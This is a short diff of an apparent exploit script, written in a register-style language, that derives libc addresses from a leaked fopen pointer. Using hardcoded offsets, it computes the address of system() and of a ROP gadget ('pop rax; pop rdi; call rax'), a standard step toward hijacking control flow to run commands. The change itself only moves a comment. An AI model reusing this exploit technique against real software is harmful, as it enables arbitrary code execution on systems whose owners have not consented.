@@ -26,16 +26,16 @@ or r1.x r1.x r1.z
 or r1.x r1.x r1.w
 mov r0.y r1.x 		/* r0 - fopen addr */
 
-/* calc system addr ( libc clone )
-pop    rax
-pop    rdi
-call   rax
-*/
+/* calc system addr */
 seti r10.x 164208	/* <fopen addr> - <system addr> */
 mov r1.xy r0.xy
 subi r1.x r1.x r10.x /* r1 - system addr */
 
-/* calc gadget addr */
+/* calc gadget addr ( libc clone )
+pop    rax
+pop    rdi
+call   rax
+*/
 seti r10.x 529723	/* <gadget addr> - <fopen addr> */
 mov r2.xy r0.xy
 addi r2.x r2.x r10.x /* r2 - gadget addr */
